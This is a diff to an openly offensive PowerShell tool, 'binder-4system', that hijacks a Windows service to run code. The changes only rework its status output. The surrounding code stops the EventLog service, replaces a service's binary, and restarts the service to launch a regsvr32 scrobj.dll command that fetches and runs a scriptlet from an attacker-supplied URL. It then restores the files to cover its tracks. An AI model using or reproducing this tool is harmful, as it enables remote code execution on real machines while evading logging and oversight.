@@ -1,6 +1,7 @@
 function binder-4system {
 param ([string]$procID,[string]$Url)
 
+$service_name = $null
 $process_target =  Get-Process -id $procid
 $nombre_objetivo =  $process
 $nombre_objetivo = $process_target.Name
@@ -11,7 +12,7 @@ $service_name = (Get-WmiObject Win32_Service -Filter "ProcessId='$($procID)'").n
 $url = "regsvr32.exe /s /n /u /i:$Url scrobj.dll"
 
 if ($nombre_objetivo,$process_target,$path_process,$pid_target,$service_name -eq $null ) {write-host "Script Error."; break} else {
-write-host 
+$resultado =
 ' _     _           _           _  _                 _                 
 | |__ (_)_ __   __| | ___ _ __| || |  ___ _   _ ___| |_ ___ _ __ ___  
 | `_ \| | `_ \ / _` |/ _ \ `__| || |_/ __| | | / __| __/ _ \ `_ ` _ \ 
@@ -20,6 +21,10 @@ write-host
                                           |___/                       
                                                      cybervaca @ hackplayers
 '}
+
+
+$resultado += "`n[+] Stop-Service $service_name"
+
 
 Stop-Service -Name EventLog  -Force ; sleep -Seconds 1
 Stop-Service -Name $service_name -Force ; sleep -Seconds 1
@@ -104,6 +109,7 @@ $get_process = Get-Process -Name $process_name ; foreach ($killprocess in $get_p
 if (($killprocess | Select-Object -Property *).description -like "*CAB*"){ $killprocess | Stop-Process -Force}
 
 }
+$resultado += "`n[+] Binding command with service."
 Copy-Item $nombre_objetivo  $nombre_objetivo_bkp 
 Copy-Item $nombre_final $nombre_objetivo 
 Start-Service -Name $service_name 
@@ -125,9 +131,6 @@ Remove-Item $nombre_final
 Remove-Item $nombre_objetivo_bkp 
 Start-Service -Name $service_name
 start-Service -Name EventLog 
-write-host "Script executed succefully"
-
+$resultado += "`n[+] Script executed succefully"
+return $resultado
 }
-
-
-
